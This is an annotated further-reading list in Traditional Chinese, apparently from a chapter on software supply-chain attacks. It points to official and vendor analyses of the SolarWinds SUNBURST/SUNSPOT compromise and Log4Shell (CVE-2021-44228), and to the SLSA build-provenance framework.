- **CISA 緊急指令 ED 21-01**：*Mitigate SolarWinds Orion Code Compromise*（2020-12-13）。<https://www.cisa.gov/news-events/directives/ed-21-01-mitigate-solarwinds-orion-code-compromise> — 一手的官方應變文件，讓你看到一個國家級的事件應變第一反應是「立刻把它斷網下線」，以及為什麼。
- **Mandiant/FireEye 技術分析**：*Highly Evasive Attacker Leverages SolarWinds Supply Chain Compromises with SUNBURST Backdoor*。<https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor> — 揭露者本人的拆解，看 SUNBURST 怎麼潛伏、避沙箱、擬態 C2，理解「為什麼自動偵測抓不到」。
- **CrowdStrike SUNSPOT 分析**：*SUNSPOT: An Implant in the Build Process*。<https://www.crowdstrike.com/en-us/blog/sunspot-malware-technical-analysis/> — 專講編譯期注入的那把工具，本章「後門不在程式裡、在做出程式的那台機器裡」這句話的技術出處。
- **CSRB Log4j 報告**：Cyber Safety Review Board, *Review of the December 2021 Log4j Event*（2022-07）。<https://www.cisa.gov/resources-tools/resources/cyber-safety-review-board-csrb-report-log4j> — 美國官方對 Log4Shell 的權威覆盤，「endemic」這個讓人不安的結論與 SBOM 治理缺口的呼籲都出自這裡。
- **NVD CVE-2021-44228**：<https://nvd.nist.gov/vuln/detail/CVE-2021-44228> — Log4Shell 的權威漏洞紀錄，CVSS 10.0 的官方評分與受影響版本範圍（2.0-beta9 至 2.14.1）。
- **SLSA 框架**：*Supply-chain Levels for Software Artifacts*。<https://slsa.dev/> — 本章設計題提到的「build provenance」的業界框架；想把「信任從來源推到內容」落地，從這裡開始看。
